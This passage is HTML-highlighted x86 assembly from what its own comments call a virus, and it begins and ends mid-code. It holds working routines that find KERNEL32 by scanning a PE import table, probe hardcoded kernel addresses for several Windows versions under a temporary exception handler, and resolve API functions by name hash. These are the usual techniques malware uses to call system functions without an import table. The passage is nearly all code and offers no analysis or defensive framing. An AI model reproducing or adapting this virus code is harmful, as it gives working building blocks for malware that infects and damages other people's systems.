    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">mapped</span><span class="sc4">-</span><span class="sc5">getitmap1</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">user32</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'USER32.DLL'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">fastcall</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">mapped</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">windowproc01</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; The Api call system (2/10/2K) - (last rev 6/12/2K)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; The principe of this api system call is that when the program call the api,</span><span class="sc0">
</span><span class="sc1">; this system will re-calculate the api call, loosing time you will say, but</span><span class="sc0">
</span><span class="sc1">; we have two advantages, no need of long name/crc table, and no need of long</span><span class="sc0">
</span><span class="sc1">; buffer to receive adresses, and if the search is fast enough, then I think</span><span class="sc0">
</span><span class="sc1">; that's okay to be done</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Api calling system was build in order to let modules call any api of any dlls</span><span class="sc0">
</span><span class="sc1">; not depending from these that the kernel import, now it assume:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   - find the kernel by finding in the import table for exported address</span><span class="sc0">
</span><span class="sc1">;        of KERNEL32 if not found, get the last dll and then</span><span class="sc0">
</span><span class="sc1">;           - scan in the lib about loaded KERNEL, if not</span><span class="sc0">
</span><span class="sc1">;                 ( - hook exception and test hardcore address,</span><span class="sc0">
</span><span class="sc1">;                    the virus don't get runned in such case</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">Api_init</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">loadpointer</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">savebase</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">api1</span><span class="sc0">          
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">; set the PE image base init</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0"> 

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">03Ch</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; load the Pe header of PE</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; edi point to it in mem</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">128</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; load import table</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc5">loopagain75</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; name rva</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc12">'NREK'</span><span class="sc0">          </span><span class="sc1">; 'NERK'</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">stoombabase</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">checkkern</span><span class="sc0">               </span><span class="sc1">; check if it's kernel32.dll</span><span class="sc0">

</span><span class="sc5">stoombabase</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">20</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; check all libs</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">loopagain75</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; load the last imported</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">                 </span><span class="sc1">; lib</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; get an import</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getcheckup</span><span class="sc0">              </span><span class="sc1">; loop to the MZ</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">03Ch</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; get the PE</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">128</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; the the import</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc5">loopagain76</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; name rva</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc12">'NREK'</span><span class="sc0">          </span><span class="sc1">; 'NERK'</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">goaway669</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">checkkern</span><span class="sc0">               </span><span class="sc1">; recheck kernel32</span><span class="sc0">

</span><span class="sc5">goaway669</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">20</span><span class="sc0">                  </span><span class="sc1">; get next entry in table</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">loopagain76</span><span class="sc0">             </span><span class="sc1">; go to there</span><span class="sc0">

</span><span class="sc5">goaway6670</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc1">; houston we got a problem!</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">FS</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; save old SEH</span><span class="sc0">

</span><span class="sc5">loadpointer</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">pseudoseh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">api85</span><span class="sc0">       </span><span class="sc1">; SEH point to teh SEH</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">FS</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc8">esp</span><span class="sc0">            

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07FFE0000h</span><span class="sc0">             </span><span class="sc1">; check win2K kernel</span><span class="sc0">

</span><span class="sc5">instr1</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">          </span><span class="sc1">; exception fault ?</span><span class="sc0">
</span><span class="sc5">instr2</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">regkernel</span><span class="sc0">               </span><span class="sc1">; go there</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07FFF0000h</span><span class="sc0">             </span><span class="sc1">; then check NT4 kernel</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">          </span><span class="sc1">; exception fault ?</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">regkernel</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0BFF70000h</span><span class="sc0">             </span><span class="sc1">; get win9x kernel</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">regkernel</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0BFF60000h</span><span class="sc0">             </span><span class="sc1">; get WinMe kernel</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">regkernel</span><span class="sc0">

</span><span class="sc1">; houston, we have a problem :[</span><span class="sc0">
</span><span class="sc1">; in this extreme case, we couldn't at all reach kernel, we are going to crash</span><span class="sc0">

</span><span class="sc5">regkernel</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">loadpointer</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">kernelbase</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">wfk</span><span class="sc0">     </span><span class="sc1">; then save it !</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">; </span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">; fix stack</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">FS</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; restore SEH</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">pseudoseh</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2ch</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; load the thread state</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">0b8h</span><span class="sc4">],</span><span class="sc5">instr2</span><span class="sc4">-</span><span class="sc5">instr1</span><span class="sc0">  </span><span class="sc1">; go to next instruction</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">checkkern</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc12">'23LE'</span><span class="sc0">        </span><span class="sc1">; KERN - EL32</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">stoombabase5</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">stambase10</span><span class="sc0">

</span><span class="sc5">stoombabase5</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc1">; go there and everything</span><span class="sc0">
                        </span><span class="sc1">; is okay!</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">stambase10</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; load an API</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; address</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getcheckup</span><span class="sc0">              </span><span class="sc1">; go to MZ</span><span class="sc0">

</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">continueproc</span><span class="sc0">

</span><span class="sc5">getcheckup</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0FFFF0000h</span><span class="sc0">              </span><span class="sc1">; get advantage of the fact</span><span class="sc0">
                        </span><span class="sc1">; that PE are loaded every</span><span class="sc0">
</span><span class="sc5">loaduntillkernel</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">; 10000h , wich</span><span class="sc0">
                        </span><span class="sc1">; permit 65535 process</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">         </span><span class="sc1">; runned on a machine</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">wefoundkernel</span><span class="sc0">               </span><span class="sc1">; loop untill MZ</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">010000h</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">loaduntillkernel</span><span class="sc0">            </span><span class="sc1">; check every 10000h</span><span class="sc0">

</span><span class="sc5">wefoundkernel</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">continueproc</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">loadpointer</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">kernelbase</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">wfk186</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">; save the kernel base</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">ApiCallit</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">             

</span><span class="sc5">Intrn_ApiCallit</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">pushad</span><span class="sc0">

</span><span class="sc5">loadpointer</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">kernelbase</span><span class="sc4">,</span><span class="sc5">ap1</span><span class="sc0">          </span><span class="sc1">; load the lib handle</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; esi = lib loaded</span><span class="sc0">
    
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">03Ch</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; go to export table</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">120</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; go to export table</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">24</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">32</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; name RVA</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc5">getapinow</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">CheckApi</span><span class="sc0">                </span><span class="sc1">; check if it's good </span><span class="sc0">
                            </span><span class="sc1">; name</span><span class="sc0">
</span><span class="sc6">loop</span><span class="sc0">        </span><span class="sc5">getapinow</span><span class="sc0">               </span><span class="sc1">; untill all checked</span><span class="sc0">

</span><span class="sc6">popad</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">; error code return</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">CheckApi</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">                     </span><span class="sc1">; save id/loc</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; get name rva</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                     </span><span class="sc1">; ebx will receive</span><span class="sc0">
                            </span><span class="sc1">; crc</span><span class="sc0">
</span><span class="sc5">getitagain</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; load the ascii value</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                     </span><span class="sc1">; add it to the crc</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                     </span><span class="sc1">; next char</span><span class="sc0">
</span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                       </span><span class="sc1">; rol ebx,3</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">                </span><span class="sc1">; untill all the</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">getitagain</span><span class="sc0">                  </span><span class="sc1">; api name was calcula.</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; requested api ?</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">gotittatam</span><span class="sc0">                  </span><span class="sc1">; no check next</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                     </span><span class="sc1">; restore id/loc</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                     </span><span class="sc1">; stack value</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">32</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; substract api ref</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">                     </span><span class="sc1">; base and mz base</span><span class="sc0">

</span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                       </span><span class="sc1">; divide by 4</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">36</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; load api index</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">                     </span><span class="sc1">; plus base</span><span class="sc0">
</span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; load api core ref</span><span class="sc0">

</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                       </span><span class="sc1">; multiply it by 4</span><span class="sc0">
